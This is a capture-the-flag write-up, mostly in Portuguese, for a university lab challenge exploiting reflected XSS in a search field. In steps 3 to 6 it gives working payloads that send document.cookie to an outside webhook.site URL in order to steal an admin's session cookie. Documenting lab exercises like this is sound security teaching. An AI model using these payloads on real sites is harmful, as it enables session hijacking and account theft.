# Challenge `My_favourite_cookies` writeup

- Vulnerability: What type of vulnerability is being exploited
  - XSS
- Where: Where is the vulnerability present
  - No campo `Link of the bug/feature request you want to report on.` 
- Impact: What results of exploiting this vulnerability
  - Obter as cookies do admin

## Steps to reproduce

1. Comecei por testar se a página era vulnerável a XSS, escrevendo um script: `<script>alert(1)</script>` no campo search, o que me abriu um pop up, então pude concluir que era vulnerável a este tipo de ataque
2. Pela descrição do desafio o objetivo era obter a cookie do admin. Pelo git tinhamos algumas pistas, começar por enviar as nossas próprias cookies em seguida enviar as cookies do admin `Hint: The admin is very curious about your bug/feature request.`, esta hint inferia que o sítio onde escrever o script, visto que existe um campo com a referência de `bug/feature request`.
3. No campo search fiz a tarefa 1.3. `Send your cookies to a website you control`, usando este script `<script>window.location="https://webhook.site/cf6efed6-9eb1-4985-83f9-1f1a9b5b6db9"</script>` que enviou um request para o site webhook
4. Seguidamente quis enviar as minhas cookies então escrevi o seguinte script no campo search, `<script>window.location="https://webhook.site/cf6efed6-9eb1-4985-83f9-1f1a9b5b6db9?cookie="+document.cookie</script>`
5. Só resta enviar as cookie do admin, para isso este necessitava de fazer um request, que poderia ser feito neste campo `Link of the bug/feature request you want to report on.` então executei o script `http://mustard.stt.rnl.tecnico.ulisboa.pt:22251/?search=<script>window.location="https://webhook.site/cf6efed6-9eb1-4985-83f9-1f1a9b5b6db9?cookie="+document.cookie</script>` que nao funcionou  
6. Fiz uma alteração no script, também uma sugestão dada para construir o payload, então o script final ficou assim, `http://mustard.stt.rnl.tecnico.ulisboa.pt:22251/?search=<script>window.location="https://webhook.site/cf6efed6-9eb1-4985-83f9-1f1a9b5b6db9?cookie="%2bdocument.cookie</script>`  
7. A flag apareceu no site webhook.

